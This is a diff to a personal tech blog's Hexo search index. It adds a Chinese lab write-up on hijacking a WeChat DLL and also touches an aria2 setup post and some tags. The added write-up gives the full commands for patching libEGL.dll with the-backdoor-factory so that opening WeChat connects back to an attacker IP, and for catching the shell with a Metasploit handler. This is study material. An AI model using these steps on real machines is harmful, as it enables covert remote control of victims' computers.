@@ -1,6 +1,20 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title><![CDATA[微信DLL劫持反弹shell]]></title>
+    <url>%2Fwechat-dll-hijack%2F</url>
+    <content type="text"><![CDATA[准备工作 复现过程 一. 准备工作1. 测试环境虚拟环境搭建：VMware Workstation 15 pro 网络模式：桥接模式 攻击机：kali Linux 2019.1 IP:192.168.43.143 靶机：Windows 7 ultimate sp1 x64 IP:192.168.43.109 微信版本：2.6.8 2. 使用工具the-backdoor-factory(BDF)：用于DLL注入 Process Explorer：用于查找DLL文件 Metasploit 二. 复现过程1.DLL注入1.1安装BDF在kali系统中安装BDF，具体步骤可以参考readme文档 123root@kali:~# git clone https://github.com/secretsquirrel/the-backdoor-factory.gitroot@kali:~# cd the-backdoor-factory/root@kali:~/the-backdoor-factory# ./install.sh 1.2获取DLL文件使用Process Explorer查找微信客户端需要的dll文件 理论上来讲路径在微信安装目录里的dll文件都可以使用，本文选择的是libEGL.dll。 1.3DLL注入把选择的DLL文件放入kali系统中，放置在the-backdoor-factory文件下内，运行如下命令 1./backdoor.py -f libEGL.dll -s reverse_shell_tcp_inline -P 6666 -H 192.168.43.143 其中，-f 表示被劫持的DLL 文件，-s 表示shell 的类型，-P 表示DLL 要连接远程主机的端口，-H 表示DLL 连接的远程主机，注意参数的大小写问题。 接下来选择注入类型，我这里只有一个类型可以选择，有的会有多种，可以自行尝试。在注入完成后，可以看到生成的文件在backdoored目录中。 2.反弹shell2.1将dll文件放回微信的安装目录中2.2使用Metasploit反弹shell打开MSF，设置exploit和payload 12use exploit/multi/handlerset payload windows/shell_reverse_tcp 设置好lhost和lport之后，使用exploit运行，监听shell。此时，在靶机中打开微信客户端，即接收到shell。]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>Metasploit</tag>
+        <tag>漏洞复现</tag>
+        <tag>微信</tag>
+        <tag>backdoor-factory</tag>
+      </tags>
+  </entry>
+  <entry>
     <title><![CDATA[如何使用aria2]]></title>
     <url>%2Faria2-install%2F</url>
     <content type="text"><![CDATA[aria2是一个非常好用的下载工具，但是对于多数人来说并不太容易去使用。这里简单说一下怎么安装，也免得自己忘了。 从GitHub上下载源码。下载完后，找个地方解压。其实这个时候，就已经可以使用了，网上说的需要在文件中添加配置文件之类的其实并不需要，只不过只能使用命令行，非常的不方便，所以我们需要搭建一个图形化的界面。 从GitHub上下载webui-aria2。同样，下载完成后解压，然后打开docs文件夹下的index.html，注意是使用web浏览器打开，就能够进入到webui管理界面了。 但是这个时候aria2并没有启动，我们需要手动启动他。在存放aria2的文件夹中打开cmd命令行，输入如下命令 1aria2c --enable-rpc --rpc-listen-all 这时，看到命令行中显示如下命令，说明服务已经启动了 123[NOTICE] IPv4 RPC: listening on TCP port 6800[NOTICE] IPv6 RPC: listening on TCP port 6800 回到web页面，点击添加就可以开始下载了。 在使用完成后，在命令行窗口使用组合键ctrl+c来关闭程序。]]></content>
@@ -233,9 +247,9 @@
       </categories>
       <tags>
         <tag>Metasploit</tag>
+        <tag>漏洞复现</tag>
         <tag>CVE-2018-20250</tag>
         <tag>WinRAR目录穿越漏洞</tag>
-        <tag>漏洞复现</tag>
       </tags>
   </entry>
   <entry>
@@ -276,9 +290,9 @@
         <category>博客搭建</category>
       </categories>
       <tags>
+        <tag>随笔</tag>
         <tag>博客搭建</tag>
         <tag>Hexo</tag>
-        <tag>随笔</tag>
         <tag>GitHub</tag>
       </tags>
   </entry>
